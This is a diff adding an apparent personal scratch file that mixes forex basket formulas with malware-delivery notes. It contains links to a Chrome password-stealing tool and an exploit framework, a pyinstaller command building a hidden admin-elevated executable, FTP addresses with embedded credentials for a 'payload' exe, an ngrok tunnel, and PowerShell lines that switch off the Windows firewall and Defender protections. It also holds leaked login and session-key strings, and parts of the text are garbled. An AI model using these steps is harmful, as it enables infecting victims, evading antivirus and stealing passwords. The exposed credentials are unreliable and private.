@@ -1,0 +1,104 @@
+(USDEUR+USDCAD+USDGBP+USDCHF+USDJPY+USDAUD+USDNZD/100)/7
+saluuuuuuuuuuuuuuuuuuuuuut F+CADJPY+CADAUD+CADNZD/100)/7
+(GBPUSD+GBPCAD+GBPEUR+GBPCHF+GBPJPY+GBPAUD+GBPNZD/100)/7
+(EURUSD+EURCAD+EURGBP+EURCHF+EURJPY+EURAUD+EURNZD/100)/7
+(CHFUSD+CHFCAD+CHFGBP+CHFEUR+CHFJPY+CHFAUD+CHFNZD/100)/7
+(JPYUSD+JPYCAD+JPYGBP+JPYCHF+EURJPY+JPYAUD+JPYNZD/100)/7
+(AUDUSD+AUDCAD+AUDGBP+AUDCHF+AUDJPY+AUDEUR+AUDNZD/100)/7
+(NZDUSD+NZDCAD+NZDGBP+NZDEUR+NZDCHF+NZDJPY+NZDAUD/100)/7
+
+dickaprio Daffy000
+
+
+
+
+https://github.com/vasco2016/shellsploit-framework/archive/master.zip
+
+
+https://prt-demo.md.it-finance.com/ProRealTime_demo/itcharts_launcher.phtml?uid=319F5067BB62E007&locale=fr_FR&timezoneOffset=1&perms=0&key=5b3f288b6f64cb5e1df1615db2c03526&webSiteId=fra&access=SPECIAL,IND_DAX_1EUR_C,IND_DAX_1PIP_C,FX_C_MINI_ST_SC,FX_C_GCSI_ST_SC,FX_C_MAIN_ST_SC,IND_DAX_MAIN_C,IND_DOW_LOMA,@EQ_GRE_ATHEX_C_SC_OY,EQ_GRE_ATHEX_C_SC_MF,@EQ_GER_XETRA_C_SC_OY,EQ_GER_XETRA_C_SC_MF,IND_DOW_STMA,FX_C_ILS_SC,BUN_EURO,IND_EURO_C,IND_ASIA_C,IND_MIB_GBL_C,IND_ASXM_GBL_C,@EQ_SAF_JSE_C_OY,EQ_SAF_JSE_C_MF,FUT_METALS_C,BIN_BITCOIN,IND_OZ_SECT_C,@EQ_US_NSQ_C_SC_OY,EQ_US_NSQ_C_SC_MF,FX_CRYPTO_AL_SC,FUT_OTHER_C,IPOs,BUN_GEN,@EQ_UK_LSE_C_SC_OY,EQ_UK_LSE_C_SC_MF,IND_DOW_LOMI,IND_DAXM_GBL_C,FX_C_MINI_SR_SC,@EQ_ITA_MIB_C_SC_OY,EQ_ITA_MIB_C_SC_MF,IND_UK_SECT_C,FUT_RATES_C,IND_FTSE_ST,FX_C_MAIN_SR_SC,IND_UK_C,IND_GBL_GBP,IND_AFRICA_C,IND_SUN_CFD_C,IND_FTSE_LOW,IND_US_C,FUT_UK_HOUSE_C,IND_CAC_MAIN_C,IND_AEX_C,@EQ_EUR_ENXT_C_SC_OY,EQ_EUR_ENXT_C_SC_MF,IND_GBL_EUR,FUT_ENERGIES_C,IND_AUS_C,IND_NIK_USD_C,FUT_US_CBOT_C&epic=
+
+deb http://http.kali.org/kali kali-rolling main non-free contrib
+
+apt-get update
+apt-get install -y virtualbox-guest-x11
+reboot
+
+
+
+
+
+oython https://www.python.org/ftp/python/3.7.3/python-3.7.3-amd64.exe
+
+
+
+
+
+
+
+https://github.com/darkarp/chrome-password-hacking
+
+
+
+https://github.com/seznam/shelter
+
+
+
+
+http://www.mediafire.com/file/83peeu3w77ej51y/192--13-4444.exe/file
+
+apt-get update -y && pt-get install -y virtualbox-guest-x11 && apt-get install python3 -y && apt-get install gcc-mingw-w64-i686 -y && apt-get upgrade -y && apt-get dist-upgrade -y
+
+
+pyinstaller -F --noconsole --uac-admin  --clean  dwd.py
+adresse du payload PeRL1-13.exe :
+ftp://bomboclap:Warzone21@@files.000webhost.com/1-13.exe
+ftp://kali@192.168.1.13/perl1-13.exe
+
+ftp://kali:0000@192.168.1.13/perl1-13.exe
+
+
+https://22f5d7a0.ngrok.io
+
+
+
+
+
+
+
+
+
+
+ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle normal (Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled false)
+ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle normal (Set-MpPreference -DIsableRealTimeMonitoring $true)
+ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle normal (Set-MpPreference -DisableIOAVProtection $true)
+TASKKILL /F /Fi "IMAGENAME eq Adobe*
+
+
+
+
+
+
+
+ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled true
+Set-MpPreference -DIsableRealTimeMonitoring $false
+Set-MpPreference -DisableIOAVProtection $false
+
+
+
+
+
+
+
+
+
+
+
+
+
+\system32>python
+Python 3.7.4 (tags/v3.7.4:e09359112e, Jul  8 2019, 20:34:20) [MSC v.1916 64 bit (AMD64)] on win32
+Type "help", "copyright", "credits" or "license" for more information.
+
+
+
